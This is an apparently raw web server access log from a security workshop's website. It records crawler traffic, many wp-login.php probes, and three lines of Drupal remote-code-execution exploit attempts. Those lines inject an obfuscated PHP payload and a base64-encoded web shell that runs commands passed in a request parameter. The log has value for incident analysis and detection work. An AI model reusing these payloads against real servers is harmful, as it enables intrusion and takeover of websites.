185.62.86.146 - - [29/Apr/2018:14:29:41 -0400] "GET /?q=user/password&name[%23post_render][]=passthru&name[%23type]=markup&name[%23markup]=echo%20%22%5C%3C?php%20%5C$rtpz=%5C%22lKHByZWdfcmVwbGFjZShhcnJheShdgnL1teXHchd9XhdHhdNdLycsJy9ccy8nKShdwgYhdXJhdyYXkoJychdsJyhdsn%5C%22;%20%5C$tsdg%20=%20str_replace(%5C%22b%5C%22,%5C%22%5C%22,%5C%22bsbtbrb_rbebpblacbe%5C%22);%20%5C$wxhw=%5C%22KhdSwgam9pbhdihhcnJhehdV9zbhdGljZSgkYSwkYygkYSktMykpKSkpO2VjaG8ghdJzhdwvJy4kahdy4nPic7fQ==%5C%22;%20%5C$feka=%5C%22hdpeyRrPSdyaXNoZXJlJhdztlhdY2hhdvICc8hdJy4kayhd4nPic7ZXhdZhbChdhiYXhdNlNjRfZGVjb2R%5C%22;%20%5C$asys=%5C%22JGM9J2NvdWhd50JzskYT0khdX0NPT0tJRTtphdZihdhyZXNhdldhdChdgkhdYSkhd9PShddtcicgJiYhdgJGMohdJGEpPjM%5C%22;%20%5C$zjzy%20=%20%5C$tsdg(%5C%22q%5C%22,%20%5C%22%5C%22,%20%5C%22qbaqsqeq6q4q_qdqecoqde%5C%22);%20%5C$liiy%20=%20%5C$tsdg(%5C%22z%5C%22,%5C%22%5C%22,%5C%22crzezatez_fzunctzizon%5C%22);%20%5C$iuwt%20=%20%5C$liiy(%5C%22%5C%22,%20%5C$zjzy(%5C$tsdg(%5C%22hd%5C%22,%20%5C%22%5C%22,%20%5C$asys.%5C$feka.%5C$rtpz.%5C$wxhw)));%20%5C$iuwt();%20?%3E%22%20%3E%20ZO40WRG4.php HTTP/1.1" 200 6640 "-" "python-requests/2.18.4"
185.62.86.146 - - [29/Apr/2018:14:29:42 -0400] "GET /file/ajax/name/%23value/form-IZOYO0dY3sY17R_zOHDp3aQgbG-J2rsXNpTfSt0zLFQ HTTP/1.1" 200 4338 "-" "python-requests/2.18.4"
185.62.86.146 - - [29/Apr/2018:14:29:45 -0400] "GET /ZO40WRG4.php HTTP/1.1" 404 8014 "-" "python-requests/2.18.4"
66.249.73.89 - - [29/Apr/2018:14:31:07 -0400] "GET /papers/1993/nspw1993-desmedt.pdf HTTP/1.1" 200 694330 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
5.45.133.169 - - [29/Apr/2018:14:31:15 -0400] "GET /favicon.ico HTTP/1.1" 404 4109 "https://www.nspw.org/papers/2008/nspw2008-beautement.pdf" "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36"
5.45.133.169 - - [29/Apr/2018:14:31:14 -0400] "GET /papers/2008/nspw2008-beautement.pdf HTTP/1.1" 200 769415 "https://www.google.jo/" "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36"
69.162.124.227 - - [29/Apr/2018:14:31:19 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
180.76.15.17 - - [29/Apr/2018:14:32:07 -0400] "GET /papers/2013/nspw2013-egelman.pdf HTTP/1.1" 200 444718 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
66.249.73.89 - - [29/Apr/2018:14:32:50 -0400] "GET /2018/dates HTTP/1.1" 200 6269 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
180.76.15.150 - - [29/Apr/2018:14:33:07 -0400] "GET /modules/node/node.css?p7kfx6 HTTP/1.1" 200 3845 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
77.88.47.40 - - [29/Apr/2018:14:33:18 -0400] "GET /papers/2010/?C=S;O=D HTTP/1.1" 200 4363 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
77.88.47.40 - - [29/Apr/2018:14:33:53 -0400] "GET /2005/oc.content HTTP/1.1" 200 6227 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
77.88.47.40 - - [29/Apr/2018:14:33:57 -0400] "GET /2009/cfp2009.pdf HTTP/1.1" 200 58186 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
207.148.125.97 - - [29/Apr/2018:14:34:07 -0400] "GET /?q=user/password&name[%23post_render][]=passthru&name[%23type]=markup&name[%23markup]=echo%20PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbJ2MnXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsnYyddIC4gJyAyPiYxJyApOyB9%20%7C%20base64%20-d%20%7C%20tee%20k.php HTTP/1.1" 200 6178 "-" "curl/7.47.0"
180.76.15.25 - - [29/Apr/2018:14:34:07 -0400] "GET /2005/jmu_infosec_logo.gif HTTP/1.1" 200 9168 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
66.249.73.87 - - [29/Apr/2018:14:34:33 -0400] "GET /papers/1997/nspw1997-mambo.pdf HTTP/1.1" 200 1056899 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.65.104 - - [29/Apr/2018:14:35:06 -0400] "GET /2007 HTTP/1.1" 301 3986 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.65.108 - - [29/Apr/2018:14:35:06 -0400] "GET /2007/ HTTP/1.1" 200 5435 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
180.76.15.12 - - [29/Apr/2018:14:35:07 -0400] "GET /2004/nspw-small.jpg HTTP/1.1" 200 6753 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
190.183.9.215 - - [29/Apr/2018:14:35:28 -0400] "GET /wp-login.php HTTP/1.1" 404 7839 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
190.183.9.215 - - [29/Apr/2018:14:35:28 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
180.76.15.5 - - [29/Apr/2018:14:36:07 -0400] "GET /2004/gini_logo.gif HTTP/1.1" 200 9610 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
66.249.73.91 - - [29/Apr/2018:14:36:17 -0400] "GET /papers/2000/nspw2000-yasinsac.pdf HTTP/1.1" 200 876323 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
69.162.124.227 - - [29/Apr/2018:14:36:19 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
105.157.187.187 - - [29/Apr/2018:14:37:52 -0400] "GET /wp-login.php HTTP/1.1" 404 7839 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
105.157.187.187 - - [29/Apr/2018:14:37:52 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
66.249.73.91 - - [29/Apr/2018:14:38:00 -0400] "GET /papers/2010/nspw2010-lilien.pdf HTTP/1.1" 200 740643 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
223.218.104.68 - - [29/Apr/2018:14:38:08 -0400] "GET / HTTP/1.1" 200 6624 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36"
66.249.73.91 - - [29/Apr/2018:14:39:43 -0400] "GET /2012/submissions HTTP/1.1" 200 6975 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
31.215.237.181 - - [29/Apr/2018:14:40:40 -0400] "GET /wp-login.php HTTP/1.1" 404 7985 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
31.215.237.181 - - [29/Apr/2018:14:40:42 -0400] "GET / HTTP/1.1" 200 8206 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
189.125.153.149 - - [29/Apr/2018:14:41:13 -0400] "GET /wp-login.php HTTP/1.1" 404 7985 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
189.125.153.149 - - [29/Apr/2018:14:41:14 -0400] "GET / HTTP/1.1" 200 8206 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
69.162.124.227 - - [29/Apr/2018:14:41:19 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
66.249.73.89 - - [29/Apr/2018:14:41:27 -0400] "GET /2009/cfp.content HTTP/1.1" 200 11043 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.73.89 - - [29/Apr/2018:14:41:45 -0400] "GET /2018/dates HTTP/1.1" 200 6269 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
147.47.7.18 - - [29/Apr/2018:14:41:59 -0400] "GET /wp-login.php HTTP/1.1" 404 7985 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
147.47.7.18 - - [29/Apr/2018:14:42:00 -0400] "GET / HTTP/1.1" 200 8206 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
66.249.73.89 - - [29/Apr/2018:14:43:11 -0400] "GET /papers/2010/nspw2010-moore.pdf HTTP/1.1" 200 741159 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
111.92.73.118 - - [29/Apr/2018:14:43:49 -0400] "GET /wp-login.php HTTP/1.1" 404 7690 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
111.92.73.118 - - [29/Apr/2018:14:43:50 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
66.249.73.89 - - [29/Apr/2018:14:44:53 -0400] "GET /papers/2007/nspw2007-somayaji.pdf HTTP/1.1" 304 3605 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
69.162.124.227 - - [29/Apr/2018:14:46:19 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
66.249.73.89 - - [29/Apr/2018:14:46:38 -0400] "GET /2009/proceedings/2001/nspw2001-brostoff.pdf HTTP/1.1" 200 1048585 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.73.89 - - [29/Apr/2018:14:48:21 -0400] "GET /papers/2011/nspw2011-bicakci.pdf HTTP/1.1" 200 493585 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
183.83.73.33 - - [29/Apr/2018:14:48:56 -0400] "GET /wp-login.php HTTP/1.1" 404 8180 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
183.83.73.33 - - [29/Apr/2018:14:48:57 -0400] "GET / HTTP/1.1" 200 8298 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
40.77.167.49 - - [29/Apr/2018:14:49:01 -0400] "GET /papers/2007/nspw2007-edwards.pdf HTTP/1.1" 200 345852 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
105.101.145.23 - - [29/Apr/2018:14:49:17 -0400] "GET /wp-login.php HTTP/1.1" 404 7484 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
105.101.145.23 - - [29/Apr/2018:14:49:19 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
40.77.167.133 - - [29/Apr/2018:14:49:07 -0400] "GET /papers/2000/nspw2000-rannenberg.pdf HTTP/1.1" 200 1059611 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
86.137.107.202 - - [29/Apr/2018:14:49:18 -0400] "GET /papers/2013/nspw2013-ard.pdf HTTP/1.1" 200 558945 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 11_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/11.0 Mobile/15E148 Safari/604.1"
77.88.47.40 - - [29/Apr/2018:14:49:58 -0400] "GET /robots.txt HTTP/1.1" 200 5979 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
77.88.47.40 - - [29/Apr/2018:14:50:01 -0400] "GET /node/84 HTTP/1.1" 200 2992 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
66.249.73.91 - - [29/Apr/2018:14:50:04 -0400] "GET /papers/2005/nspw2005-bishop-pos.pdf HTTP/1.1" 200 609280 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
157.55.39.27 - - [29/Apr/2018:14:50:04 -0400] "GET /robots.txt HTTP/1.1" 200 4639 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
77.88.47.40 - - [29/Apr/2018:14:50:05 -0400] "GET /current/papers.shtml HTTP/1.1" 404 4620 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
157.55.39.190 - - [29/Apr/2018:14:50:24 -0400] "GET /2018/cfp HTTP/1.1" 200 8622 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
213.103.207.92 - - [29/Apr/2018:14:50:28 -0400] "GET /wp-login.php HTTP/1.1" 404 7985 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
213.103.207.92 - - [29/Apr/2018:14:50:28 -0400] "GET / HTTP/1.1" 200 8206 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
69.162.124.227 - - [29/Apr/2018:14:51:19 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
66.249.73.87 - - [29/Apr/2018:14:51:47 -0400] "GET /2016 HTTP/1.1" 200 6965 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.73.91 - - [29/Apr/2018:14:53:30 -0400] "GET /2017/program HTTP/1.1" 200 7339 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.73.91 - - [29/Apr/2018:14:55:14 -0400] "GET /papers/2010/nspw2010-raskin.pdf HTTP/1.1" 200 610901 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
165.73.22.120 - - [29/Apr/2018:14:55:44 -0400] "GET /wp-login.php HTTP/1.1" 404 7985 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
165.73.22.120 - - [29/Apr/2018:14:55:44 -0400] "GET / HTTP/1.1" 200 8206 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
69.162.124.227 - - [29/Apr/2018:14:56:19 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
66.249.73.87 - - [29/Apr/2018:14:57:06 -0400] "GET /papers/2007/nspw2007-kursawe.pdf HTTP/1.1" 304 3605 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.73.89 - - [29/Apr/2018:14:58:40 -0400] "GET /papers/2008/nspw2008-greenwald.pdf HTTP/1.1" 304 3605 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
179.125.236.103 - - [29/Apr/2018:14:59:03 -0400] "GET /wp-login.php HTTP/1.1" 404 7839 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
179.125.236.103 - - [29/Apr/2018:14:59:05 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
157.55.39.190 - - [29/Apr/2018:14:59:33 -0400] "GET /2018/dates HTTP/1.1" 200 6743 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
40.77.167.49 - - [29/Apr/2018:14:59:40 -0400] "GET /misc/drupal.js?p7r9uw HTTP/1.1" 200 11241 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
40.77.167.49 - - [29/Apr/2018:14:59:45 -0400] "GET /robots.txt HTTP/1.1" 200 4979 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
40.77.167.49 - - [29/Apr/2018:14:59:46 -0400] "GET /robots.txt HTTP/1.1" 200 1110 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
157.55.39.190 - - [29/Apr/2018:14:59:46 -0400] "GET /misc/jquery.once.js?v=1.2 HTTP/1.1" 200 5314 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
40.77.167.46 - - [29/Apr/2018:14:59:57 -0400] "GET /misc/jquery.js?v=1.4.4 HTTP/1.1" 200 31470 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
66.249.73.91 - - [29/Apr/2018:15:00:24 -0400] "GET /papers/1993/nspw1993-michael.pdf HTTP/1.1" 200 642526 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
69.162.124.227 - - [29/Apr/2018:15:01:19 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
178.222.159.227 - - [29/Apr/2018:15:02:03 -0400] "GET /wp-login.php HTTP/1.1" 404 7985 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
178.222.159.227 - - [29/Apr/2018:15:02:05 -0400] "GET / HTTP/1.1" 200 8206 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
66.249.73.89 - - [29/Apr/2018:15:02:07 -0400] "GET /papers/1993/nspw1993-mclean.pdf HTTP/1.1" 200 609147 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
180.76.15.138 - - [29/Apr/2018:15:02:17 -0400] "GET /proceedings/2000 HTTP/1.1" 200 12193 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
41.110.194.16 - - [29/Apr/2018:15:02:26 -0400] "GET /wp-login.php HTTP/1.1" 404 7985 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
41.110.194.16 - - [29/Apr/2018:15:02:27 -0400] "GET / HTTP/1.1" 200 8206 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
5.255.250.67 - - [29/Apr/2018:15:03:30 -0400] "GET /2015/organizers HTTP/1.1" 200 7117 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
66.249.73.87 - - [29/Apr/2018:15:03:51 -0400] "GET /papers/1997/nspw1997-moskowitz.pdf HTTP/1.1" 200 1361656 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
199.16.157.180 - - [29/Apr/2018:15:05:17 -0400] "GET /robots.txt HTTP/1.1" 200 5699 "-" "Twitterbot/1.0"
66.249.73.87 - - [29/Apr/2018:15:05:34 -0400] "GET /2012 HTTP/1.1" 200 6877 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
69.162.124.227 - - [29/Apr/2018:15:06:19 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
66.249.73.91 - - [29/Apr/2018:15:07:17 -0400] "GET /2003/past.html HTTP/1.1" 404 8000 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.73.89 - - [29/Apr/2018:15:09:00 -0400] "GET /papers/2000/nspw2000-irvine.pdf HTTP/1.1" 200 689480 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
129.2.180.66 - - [29/Apr/2018:15:09:53 -0400] "GET /2009/proceedings/2009/nspw2009-herley.pdf HTTP/1.1" 200 189209 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36"
129.2.180.66 - - [29/Apr/2018:15:09:54 -0400] "GET /favicon.ico HTTP/1.1" 404 700 "https://www.nspw.org/2009/proceedings/2009/nspw2009-herley.pdf" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36"
177.203.115.103 - - [29/Apr/2018:15:10:17 -0400] "GET /wp-login.php HTTP/1.1" 404 7491 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
177.203.115.103 - - [29/Apr/2018:15:10:19 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
66.249.73.89 - - [29/Apr/2018:15:10:44 -0400] "GET /2018/cfp HTTP/1.1" 200 8152 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
69.162.124.227 - - [29/Apr/2018:15:11:19 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
82.76.234.47 - - [29/Apr/2018:15:11:30 -0400] "GET /wp-login.php HTTP/1.1" 404 7839 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
82.76.234.47 - - [29/Apr/2018:15:11:32 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
66.249.73.91 - - [29/Apr/2018:15:12:27 -0400] "GET /papers/2000/nspw2000-atallah.pdf HTTP/1.1" 200 1294936 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.73.87 - - [29/Apr/2018:15:14:10 -0400] "GET /2007/cfp2006.pdf HTTP/1.1" 200 40940 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
70.30.204.7 - - [29/Apr/2018:15:14:22 -0400] "GET /wp-login.php HTTP/1.1" 404 7839 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
70.30.204.7 - - [29/Apr/2018:15:14:22 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
66.249.73.89 - - [29/Apr/2018:15:15:54 -0400] "GET /papers/2000/nspw2000-bruschi.pdf HTTP/1.1" 200 614349 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
69.162.124.227 - - [29/Apr/2018:15:16:19 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
207.148.125.97 - - [29/Apr/2018:15:16:56 -0400] "GET /?q=user/password&name[%23post_render][]=passthru&name[%23type]=markup&name[%23markup]=echo%20PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbJ2MnXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsnYyddIC4gJyAyPiYxJyApOyB9%20%7C%20base64%20-d%20%7C%20tee%20k.php HTTP/1.1" 200 6180 "-" "curl/7.47.0"
66.249.73.89 - - [29/Apr/2018:15:17:37 -0400] "GET /papers/2000/nspw2000-moskowitz.pdf HTTP/1.1" 200 1052619 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
93.158.161.149 - - [29/Apr/2018:15:19:16 -0400] "GET /2007/cfp.shtml HTTP/1.1" 200 8420 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
66.249.73.89 - - [29/Apr/2018:15:19:20 -0400] "GET /2003/pc.html HTTP/1.1" 404 7996 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.73.89 - - [29/Apr/2018:15:21:04 -0400] "GET /papers/2004/nspw2004-beznosov.pdf HTTP/1.1" 200 171609 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
69.162.124.227 - - [29/Apr/2018:15:21:19 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
66.249.73.87 - - [29/Apr/2018:15:22:47 -0400] "GET /papers/2007/nspw2007-mannan.pdf HTTP/1.1" 200 502565 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
191.189.22.13 - - [29/Apr/2018:15:23:12 -0400] "GET /wp-login.php HTTP/1.1" 404 7491 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
191.189.22.13 - - [29/Apr/2018:15:23:13 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
